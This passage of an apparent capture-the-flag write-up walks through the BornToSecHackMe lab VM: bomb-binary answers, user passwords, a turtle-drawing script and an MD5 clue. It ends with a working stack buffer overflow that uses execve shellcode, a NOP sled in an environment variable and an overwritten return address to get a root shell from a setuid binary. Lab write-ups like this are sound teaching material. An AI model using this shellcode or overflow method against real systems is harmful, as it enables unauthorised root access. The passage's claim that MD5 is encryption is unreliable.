   0x08048e42 <+170>:   jle    0x8048e10 <phase_6+120>
   0x08048e44 <+172>:   mov    -0x30(%ebp),%esi
   0x08048e47 <+175>:   mov    %esi,-0x34(%ebp)
   0x08048e4a <+178>:   mov    $0x1,%edi
   0x08048e4f <+183>:   lea    -0x30(%ebp),%edx
   0x08048e52 <+186>:   mov    (%edx,%edi,4),%eax
   0x08048e55 <+189>:   mov    %eax,0x8(%esi)
   0x08048e58 <+192>:   mov    %eax,%esi
   0x08048e5a <+194>:   inc    %edi
   0x08048e5b <+195>:   cmp    $0x5,%edi
   0x08048e5e <+198>:   jle    0x8048e52 <phase_6+186>
   0x08048e60 <+200>:   movl   $0x0,0x8(%esi)
   0x08048e67 <+207>:   mov    -0x34(%ebp),%esi
   0x08048e6a <+210>:   xor    %edi,%edi
   0x08048e6c <+212>:   lea    0x0(%esi,%eiz,1),%esi
   0x08048e70 <+216>:   mov    0x8(%esi),%edx
   0x08048e73 <+219>:   mov    (%esi),%eax
   0x08048e75 <+221>:   cmp    (%edx),%eax
   0x08048e77 <+223>:   jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:   call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:   mov    0x8(%esi),%esi
   0x08048e81 <+233>:   inc    %edi
   0x08048e82 <+234>:   cmp    $0x4,%edi
   0x08048e85 <+237>:   jle    0x8048e70 <phase_6+216>
   0x08048e87 <+239>:   lea    -0x58(%ebp),%esp
   0x08048e8a <+242>:   pop    %ebx
   0x08048e8b <+243>:   pop    %esi
   0x08048e8c <+244>:   pop    %edi
   0x08048e8d <+245>:   mov    %ebp,%esp
   0x08048e8f <+247>:   pop    %ebp
   0x08048e90 <+248>:   ret
End of assembler dump.

(gdb) info var
All defined variables:

File init.c:
int _IO_stdin_used;

File bomb.c:
struct _IO_FILE *infile;

Non-debugging symbols:
[...]
0x0804b230  node6				// 432
0x0804b23c  node5				// 212
0x0804b248  node4				// 997
0x0804b254  node3				// 301
0x0804b260  node2				// 725
0x0804b26c  node1				// 253
[...]
```

Phase 6 requires to input 6 numbers. It also somehow sorts 6 global variables and compares the result with the order we provide by our 6 input numbers.
As the hint for this phase is "4" and node4 is the biggest so let's sort numbers in descending order:
`4 2 6 3 1 5`

**Answer:** `4 2 6 3 1 5`

#### Diffusing the bomb

> HINT:
> P
>  2
>  b
> 
> o
> 4

Final answers:

> 1) Public speaking is very easy.  
> 2) 1 2 6 24 120 720
> 3) 1 b 214 || 2 b 755 || 7 b 524
> 4) 9
> 5) opukmq || opekma || opukma || opekmq
> 6) 4 2 6 3 1 5 

```
laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
2 b 755
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```
The problem is that all these variations work for diffusing the bomb and so we will have to try several possible passwords to become `thor`:

Possible passwords:
```
Publicspeakingisveryeasy.126241207201b2149opukmq426315  -> No
Publicspeakingisveryeasy.126241207201b2149opekma426315  -> No
Publicspeakingisveryeasy.126241207201b2149opukma426315  -> No
Publicspeakingisveryeasy.126241207201b2149opekmq426315  -> No
Publicspeakingisveryeasy.126241207202b7559opukmq426315  -> No
Publicspeakingisveryeasy.126241207202b7559opekma426315  -> No
Publicspeakingisveryeasy.126241207202b7559opukma426315  -> No
Publicspeakingisveryeasy.126241207202b7559opekmq426315  -> No
Publicspeakingisveryeasy.126241207207b5249opukmq426315  -> No
Publicspeakingisveryeasy.126241207207b5249opekma426315  -> No
Publicspeakingisveryeasy.126241207207b5249opukma426315  -> No
Publicspeakingisveryeasy.126241207207b5249opekmq426315  -> No
```

So none of the possible passwords work. As it turns out there is an error in phase_6 answer.
It should be `4 2 6 1 3 5`

Time to try this once again...
This worked:
`Publicspeakingisveryeasy.126241207201b2149opekmq426135`

*Why this error prevails is a mistery*

### thor
```
thor@BornToSecHackMe:~$ ls
README  turtle

thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.

thor@BornToSecHackMe:~$ ./turtle
./turtle: line 1: Tourne: command not found
./turtle: line 2: Avance: command not found
./turtle: line 3: Avance: command not found
./turtle: line 4: Tourne: command not found
[...]
./turtle: line 1468: Avance: command not found
./turtle: line 1469: Recule: command not found
./turtle: line 1471: syntax error near unexpected token `)'
./turtle: line 1471: `Can you digest the message? :)'

thor@BornToSecHackMe:~$ cat turtle
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
[...]
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
```
Thor has another challenge for us that looks like a series of directional steps to draw a picture(like in children's programing games). Lets write python scipt to draw the picture:
 
```
#! /usr/bin/env python3

from turtle import *
import os
import time

file = open(os.path.dirname(os.path.abspath(__file__))+'/turtle', 'r')
for line in file.readlines():
    if line == "\n":
        time.sleep(1)
        #reset()
        continue
    words = line.split()
    cmd = words[0]
    if cmd == 'Tourne':
        n = int(words[3])
        if words[1] == 'droite':
            right(n)
        elif words[1] == 'gauche':
            left(n)
    elif cmd == 'Avance':
        n = int(words[1])
        forward(n)
    elif cmd == 'Recule':
        n = int(words[1])
        backward(n)
    else:
        print(line)
file.close()
```

The art obtained spells `SLASH` and turtle file asks us "Can you digest the message? :)"

Just `SLASH` doesn't work as zaz's password so we have to think some more.
The word "message" in the last line of turtle is a clue for us. It hints at md5 encryption.
[MD5 or the MD5 Message Digest algorithm](https://www.md5.cz/) is an ecryption method so we will try to use it to encrypt `SLASH`:
`646da671ca01bb5d84dbb5fb2238dc8e`

### zaz

```
zaz@BornToSecHackMe:~$ ls
exploit_me  mail
zaz@BornToSecHackMe:~$ ls -la
total 12
drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
drwxrwx--x 1 www-data root   60 Oct 13  2015 ..
-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo

zaz@BornToSecHackMe:~$ ls mail/
INBOX.Drafts  INBOX.Sent  INBOX.Trash

zaz@BornToSecHackMe:~$ ./exploit_me aaa
aaa
```
Zaz has for us another puzzle but no hints. Let's start as always with gdb:
```
zaz@BornToSecHackMe:~$ gdb ./exploit_me
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp				// 0x90 = 144
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>		// argc > 1
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax			// 0xc = 12
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax			// 0x10 = 16
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave
   0x08048437 <+67>:    ret
End of assembler dump.
```

As there is a `strcpy` function which makes this program vulnerable to buffer overflow. We can use this to find the offset and rewrite EIP register. The offset can be calculated manually but it is quicker to use [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```
zaz@BornToSecHackMe:~$ gdb ./exploit_me
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

Offset is 140

Now we will overwrite EIP to jump to the sellcode which executes `/bin/bash` command. This shellcode we will store in environment variable.

[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html) for `execve("/bin/sh")`:
`"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`.
It is 23 bytes long.

To include room for error in our jump to shellcode we will buffer it with nop instructions so it will look like this: `python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`

After creating the env variable we will want to find it's address:

```
zaz@BornToSecHackMe:~$ export SHELLCODE=`python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
zaz@BornToSecHackMe:~$ gdb ./exploit_me
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) r
Starting program: /home/zaz/exploit_me

Breakpoint 1, 0x080483f7 in main ()
(gdb) x/s *((char **)environ+0)
0xbffff83f:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
(gdb) x/100xg 0xbffff83f
0xbffff83f:     0x444f434c4c454853      0x9090909090903d45
0xbffff84f:     0x9090909090909090      0x9090909090909090
0xbffff85f:     0x9090909090909090      0x9090909090909090
0xbffff86f:     0x9090909090909090      0x9090909090909090
0xbffff87f:     0x9090909090909090      0x9090909090909090
0xbffff88f:     0x9090909090909090      0x9090909090909090
0xbffff89f:     0x9090909090909090      0x9090909090909090
0xbffff8af:     0x9090909090909090      0x9090909090909090
0xbffff8bf:     0x9090909090909090      0x9090909090909090
0xbffff8cf:     0x9090909090909090      0x9090909090909090
0xbffff8df:     0x9090909090909090      0x9090909090909090
0xbffff8ef:     0x9090909090909090      0x9090909090909090
0xbffff8ff:     0x9090909090909090      0x9090909090909090
0xbffff90f:     0x2f2f6850c0319090      0x896e69622f686873
0xbffff91f:     0xcd0bb0e1895350e3      0x3d4c4c4548530080
[...]
```
SHELLCODE is located at `0xbffff83f`. Knowing this we can start exploit_me with this small script:
`python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "i"*140 + "\xbf\xf8\xff\xbf"'`
iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii    
# whoami
root
```

**Finally we are Root**
